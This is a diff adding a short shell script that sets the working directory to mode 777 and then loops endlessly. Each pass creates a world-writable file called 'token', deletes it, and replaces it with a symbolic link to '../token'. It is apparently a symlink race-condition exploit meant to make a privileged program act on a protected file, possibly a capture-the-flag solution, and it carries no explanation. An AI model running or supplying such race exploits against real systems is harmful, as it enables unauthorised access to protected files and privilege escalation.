@@ -1,0 +1,10 @@
+chmod 777 .
+while(true)
+do
+touch token
+chmod 777 token
+rm token
+ln -s ../token token
+rm token
+
+done
